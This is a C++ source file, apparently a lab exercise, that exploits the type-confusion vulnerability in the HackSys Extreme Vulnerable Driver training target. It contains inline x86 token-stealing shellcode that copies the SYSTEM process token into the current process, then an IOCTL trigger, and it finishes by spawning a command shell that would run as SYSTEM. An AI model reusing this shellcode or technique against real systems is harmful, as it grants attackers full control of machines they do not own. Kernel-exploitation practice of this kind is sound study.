// HEVD_TYPE_CONFUSION.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>

// 抄的shellcode
void shellcode()
{
	_asm
	{
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50]   // 找到_EPROCESS结构
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// 循环是为了获取system的_EPROCESS
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// 找到进程活动链表
					 sub eax, 0xb8    		// 链表遍历
					 cmp[eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
					 jnz find_sys_pid

					 // 替换Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 pop ebp
					 ret 8
	}
}


struct EXP_OBJ
{
	DWORD member1;
	DWORD member2;
};

int main()
{

	HANDLE hDevice = NULL;
	DWORD recv = NULL;

	hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (FAILED(hDevice))
	{
		printf("Failed to open device\n");
		return 0;
	}

	//将 shellcode 的地址写到 member2 的位置
	EXP_OBJ * obj = new EXP_OBJ();
	obj->member1 = (DWORD)0x12345678;
	obj->member2 = (DWORD)shellcode;

	DeviceIoControl(hDevice, 0x222023, obj, sizeof(EXP_OBJ), NULL, NULL, &recv, NULL);

	CloseHandle(hDevice);
	system("start cmd.exe");
    std::cout << "Done!\n";
}